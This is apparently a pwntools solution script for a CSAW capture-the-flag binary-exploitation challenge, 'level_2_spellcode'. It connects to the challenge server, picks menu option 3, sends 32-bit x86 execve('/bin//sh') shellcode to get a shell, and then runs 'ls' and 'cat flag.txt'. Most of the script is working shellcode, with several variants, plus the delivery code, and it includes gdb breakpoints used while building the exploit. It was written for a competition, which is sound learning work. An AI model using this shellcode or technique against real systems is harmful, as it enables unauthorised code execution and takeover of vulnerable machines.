#!/usr/bin/env python3

from pwn import *
import base64

REMOTE = 1

shellcode1 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode2 = b"\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\x6e\0\0\0\0\0\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode3 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode4 = b"\x81\x40\x0C\x90\x90\x90\x90\x80\x40\x10\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode5 = b"\x81\x40\x0C\x31\xd2\x90\x90\x80\x40\x10\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcodefake = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ'#All 40 bytes are accepted

shellcode = shellcode5

print("Not super reliable; if it hangs just do ^C and try running again\n")

if REMOTE:
    p = remote('pwn.red.csaw.io',5009)
else:
    #p = process('level_2_spellcode')
    p = gdb.debug('./level_2_spellcode', gdbscript=(''
        +'gef config context.nb_lines_stack 20\n'#show esp - 0x48
        +'break runGame\n'#has edx been set to 5 yet?
       #+'break *0x08048811\n'#about to putchar('>')
       #+'break *0x08048832\n'#about to CMP number input with 1
       #+'break *0x080488ff\n'#just flushed stdout in option 3
       #+'break *0x0804890a\n'#about to read shellcode; read target is $esp+0x24 (same as $ebp-0x34, $ebp-52)
       #+'break *0x0804890f\n'#just read shellcode; yet to increment stack pointer by 0x10
       #+'break *0x08048927\n'#just opened /dev/zero
       #+'break *0x0804893e\n'#just read zeros; yet to increment stack pointer by 0x10
        +'break *0x0804894b\n'#just checked amt_read>0
        +'break *0x0804892d\n'#about to push 0x5
        )
        )

print(p.recvuntil('>').decode('ascii'))

print('3')
p.sendline(b"3")

print(p.recvuntil('>').decode('ascii'))

print('sending shellcode')
p.sendline(shellcode)

print(p.recv().decode('ascii'))

print('ls')
p.sendline(b'ls')

print(p.recv().decode('ascii'))

p.sendline(b'cat flag.txt')

print(p.recv().decode('ascii'))

p.close()
